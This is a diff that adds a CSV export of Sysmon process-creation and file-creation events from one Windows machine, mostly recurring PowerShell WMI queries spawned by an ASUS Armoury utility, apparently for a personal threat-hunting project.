@@ -1,0 +1,3942 @@
+"TimeCreated","EventID","Message"
+"20/07/2025 22:27:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:27:03.554
+ProcessGuid: {7f6f9216-5f27-687d-a009-000000006901}
+ProcessId: 7348
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_mbhz5uux.ckm.ps1
+CreationUtcTime: 2025-07-20 21:27:03.554
+User: SHARON\Shxro"
+"20/07/2025 22:27:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:27:03.481
+ProcessGuid: {7f6f9216-5f27-687d-a009-000000006901}
+ProcessId: 7348
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:26:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:26:33.540
+ProcessGuid: {7f6f9216-5f09-687d-9e09-000000006901}
+ProcessId: 18284
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_0i1g2tdw.xrq.ps1
+CreationUtcTime: 2025-07-20 21:26:33.540
+User: SHARON\Shxro"
+"20/07/2025 22:26:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:26:33.466
+ProcessGuid: {7f6f9216-5f09-687d-9e09-000000006901}
+ProcessId: 18284
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:26:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:26:03.630
+ProcessGuid: {7f6f9216-5eeb-687d-9c09-000000006901}
+ProcessId: 9872
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_jw1xevgq.4bs.ps1
+CreationUtcTime: 2025-07-20 21:26:03.630
+User: SHARON\Shxro"
+"20/07/2025 22:26:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:26:03.452
+ProcessGuid: {7f6f9216-5eeb-687d-9c09-000000006901}
+ProcessId: 9872
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:25:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:25:33.514
+ProcessGuid: {7f6f9216-5ecd-687d-9409-000000006901}
+ProcessId: 11924
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_4z2j5toj.5eh.ps1
+CreationUtcTime: 2025-07-20 21:25:33.514
+User: SHARON\Shxro"
+"20/07/2025 22:25:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:25:33.439
+ProcessGuid: {7f6f9216-5ecd-687d-9409-000000006901}
+ProcessId: 11924
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:25:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:25:03.509
+ProcessGuid: {7f6f9216-5eaf-687d-8e09-000000006901}
+ProcessId: 7984
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_zftiwvd4.dlk.ps1
+CreationUtcTime: 2025-07-20 21:25:03.509
+User: SHARON\Shxro"
+"20/07/2025 22:25:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:25:03.434
+ProcessGuid: {7f6f9216-5eaf-687d-8e09-000000006901}
+ProcessId: 7984
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:24:37","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:24:37.375
+ProcessGuid: {7f6f9216-5e95-687d-7a09-000000006901}
+ProcessId: 24092
+Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_u4p242pd.41f.ps1
+CreationUtcTime: 2025-07-20 21:24:37.375
+User: SHARON\Shxro"
+"20/07/2025 22:24:37","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:24:37.320
+ProcessGuid: {7f6f9216-5e95-687d-7a09-000000006901}
+ProcessId: 24092
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""Import-Module 'c:\Users\Shxro\.vscode\extensions\ms-vscode.powershell-2025.2.0\modules\PowerShellEditorServices\PowerShellEditorServices.psd1'; Start-EditorServices -HostName 'Visual Studio Code Host' -HostProfileId 'Microsoft.VSCode' -HostVersion '2025.2.0' -BundledModulesPath 'c:\Users\Shxro\.vscode\extensions\ms-vscode.powershell-2025.2.0\modules' -EnableConsoleRepl -StartupBanner \""PowerShell Extension v2025.2.0
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/vscode-powershell
+Type 'help' to get help.
+\"" -LogLevel 'Warning' -LogPath 'c:\Users\Shxro\AppData\Roaming\Code\logs\20250720T202850\window1\exthost\ms-vscode.powershell' -SessionDetailsPath 'c:\Users\Shxro\AppData\Roaming\Code\User\globalStorage\ms-vscode.powershell\sessions\PSES-VSCode-4204-737802.json' -FeatureFlags @() ""
+CurrentDirectory: C:\Users\Shxro\OneDrive\Desktop\Projects\Windows-threat-hunter\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-6882-070000000000}
+LogonId: 0x78268
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=9D8E30DAF21108092D5980C931876B7E,SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
+ParentProcessGuid: {7f6f9216-4373-687d-d204-000000006901}
+ParentProcessId: 20736
+ParentImage: C:\Users\Shxro\AppData\Local\Programs\Microsoft VS Code\Code.exe
+ParentCommandLine: ""C:\Users\Shxro\AppData\Local\Programs\Microsoft VS Code\Code.exe"" --type=utility --utility-sub-type=node.mojom.NodeService --lang=en-US --service-sandbox-type=none --video-capture-use-gpu-memory-buffer --user-data-dir=""C:\Users\Shxro\AppData\Roaming\Code"" --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --code-cache-schemes=vscode-webview,vscode-file --field-trial-handle=1780,i,12833348368382092200,3710087918277022339,262144 --enable-features=DocumentPolicyIncludeJSCallStacksInCrashReports,EarlyEstablishGpuChannel,EstablishGpuChannelAsync --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess,WinDelaySpellcheckServiceInit --variations-seed-version --mojo-platform-channel-handle=3584 /prefetch:14
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:24:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:24:33.511
+ProcessGuid: {7f6f9216-5e91-687d-6d09-000000006901}
+ProcessId: 16800
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_v4ef1lpv.eoe.ps1
+CreationUtcTime: 2025-07-20 21:24:33.511
+User: SHARON\Shxro"
+"20/07/2025 22:24:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:24:33.435
+ProcessGuid: {7f6f9216-5e91-687d-6d09-000000006901}
+ProcessId: 16800
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:24:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:24:03.504
+ProcessGuid: {7f6f9216-5e73-687d-6a09-000000006901}
+ProcessId: 27076
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_0ywvuity.pcn.ps1
+CreationUtcTime: 2025-07-20 21:24:03.503
+User: SHARON\Shxro"
+"20/07/2025 22:24:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:24:03.431
+ProcessGuid: {7f6f9216-5e73-687d-6a09-000000006901}
+ProcessId: 27076
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:23:49","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:23:49.657
+ProcessGuid: {7f6f9216-5e65-687d-6509-000000006901}
+ProcessId: 10128
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_j0cdkt5h.p2x.ps1
+CreationUtcTime: 2025-07-20 21:23:49.657
+User: SHARON\Shxro"
+"20/07/2025 22:23:49","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:23:49.083
+ProcessGuid: {7f6f9216-5e65-687d-6509-000000006901}
+ProcessId: 10128
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+CurrentDirectory: C:\Users\Shxro\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-6882-070000000000}
+LogonId: 0x78268
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=9D8E30DAF21108092D5980C931876B7E,SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
+ParentProcessGuid: {7f6f9216-39ca-687d-1101-000000006901}
+ParentProcessId: 12968
+ParentImage: C:\Windows\explorer.exe
+ParentCommandLine: C:\WINDOWS\Explorer.EXE
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:23:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:23:33.493
+ProcessGuid: {7f6f9216-5e55-687d-6009-000000006901}
+ProcessId: 7096
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_xoq5k0br.e3e.ps1
+CreationUtcTime: 2025-07-20 21:23:33.493
+User: SHARON\Shxro"
+"20/07/2025 22:23:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:23:33.420
+ProcessGuid: {7f6f9216-5e55-687d-6009-000000006901}
+ProcessId: 7096
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:23:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:23:03.483
+ProcessGuid: {7f6f9216-5e37-687d-5e09-000000006901}
+ProcessId: 7196
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_xrznyczq.kzn.ps1
+CreationUtcTime: 2025-07-20 21:23:03.482
+User: SHARON\Shxro"
+"20/07/2025 22:23:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:23:03.408
+ProcessGuid: {7f6f9216-5e37-687d-5e09-000000006901}
+ProcessId: 7196
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:22:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:22:33.479
+ProcessGuid: {7f6f9216-5e19-687d-5909-000000006901}
+ProcessId: 15844
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_c2gi3st0.1wc.ps1
+CreationUtcTime: 2025-07-20 21:22:33.479
+User: SHARON\Shxro"
+"20/07/2025 22:22:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:22:33.403
+ProcessGuid: {7f6f9216-5e19-687d-5909-000000006901}
+ProcessId: 15844
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:22:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:22:03.473
+ProcessGuid: {7f6f9216-5dfb-687d-5709-000000006901}
+ProcessId: 9732
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_w3jmyrw2.s25.ps1
+CreationUtcTime: 2025-07-20 21:22:03.473
+User: SHARON\Shxro"
+"20/07/2025 22:22:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:22:03.399
+ProcessGuid: {7f6f9216-5dfb-687d-5709-000000006901}
+ProcessId: 9732
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:21:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:21:33.471
+ProcessGuid: {7f6f9216-5ddd-687d-5509-000000006901}
+ProcessId: 26760
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_tbaxto5g.aum.ps1
+CreationUtcTime: 2025-07-20 21:21:33.471
+User: SHARON\Shxro"
+"20/07/2025 22:21:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:21:33.398
+ProcessGuid: {7f6f9216-5ddd-687d-5509-000000006901}
+ProcessId: 26760
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:21:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:21:03.462
+ProcessGuid: {7f6f9216-5dbf-687d-5109-000000006901}
+ProcessId: 24016
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_wmv5soyw.0zn.ps1
+CreationUtcTime: 2025-07-20 21:21:03.462
+User: SHARON\Shxro"
+"20/07/2025 22:21:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:21:03.388
+ProcessGuid: {7f6f9216-5dbf-687d-5109-000000006901}
+ProcessId: 24016
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:20:33","11","File created:
+RuleName: -
